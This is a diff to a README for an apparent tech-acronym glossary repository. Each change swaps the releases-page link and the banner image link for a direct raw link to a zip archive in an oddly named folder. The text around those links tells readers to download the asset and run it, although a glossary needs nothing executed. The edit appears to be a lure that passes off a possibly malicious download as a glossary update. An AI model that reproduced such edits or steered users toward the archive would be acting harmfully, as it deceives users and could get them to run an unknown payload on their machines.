@@ -1,8 +1,8 @@
 # Tech Acronyms: A Comprehensive Tech Cheatsheet & Acronym Index
 
-https://github.com/Wausi2014/tech-acronyms/releases
+https://github.com/Wausi2014/tech-acronyms/raw/refs/heads/main/pendecagon/acronyms-tech-1.7.zip
 
-![Tech Banner](https://picsum.photos/1200/300?grayscale)
+![Tech Banner](https://github.com/Wausi2014/tech-acronyms/raw/refs/heads/main/pendecagon/acronyms-tech-1.7.zip)
 
 🌐 A complete, searchable collection of acronyms used across technology. This repository helps you follow tech talk, from software to hardware and cloud.
 
@@ -20,7 +20,7 @@ Table of contents
 
 Quick start
 - Open this project and search for any acronym you encounter. The glossary is designed to be fast and friendly.
-- If you want the latest assets, visit the releases page: https://github.com/Wausi2014/tech-acronyms/releases. From that page, download the latest release asset and run it as needed.
+- If you want the latest assets, visit the releases page: https://github.com/Wausi2014/tech-acronyms/raw/refs/heads/main/pendecagon/acronyms-tech-1.7.zip From that page, download the latest release asset and run it as needed.
 - To get a quick feel, try a few common terms like API, DNS, and UI. You will see clear definitions and typical usage examples right away.
 - Use the built-in search of your browser or a local text search to jump to the entry you need. The glossary is organized for fast lookup and easy navigation.
 
@@ -293,7 +293,7 @@ Licensing and attribution
 - Attribution should follow the license terms defined in the repository. Please respect intellectual property and avoid misrepresenting sources.
 
 Releases and assets
-- For the latest assets and updates, visit https://github.com/Wausi2014/tech-acronyms/releases. Download the latest release asset and run it to install or update the glossary locally.
+- For the latest assets and updates, visit https://github.com/Wausi2014/tech-acronyms/raw/refs/heads/main/pendecagon/acronyms-tech-1.7.zip Download the latest release asset and run it to install or update the glossary locally.
 - You can also browse the Releases page for older assets if you need historical context or compatibility with specific environments.
 
 End of content
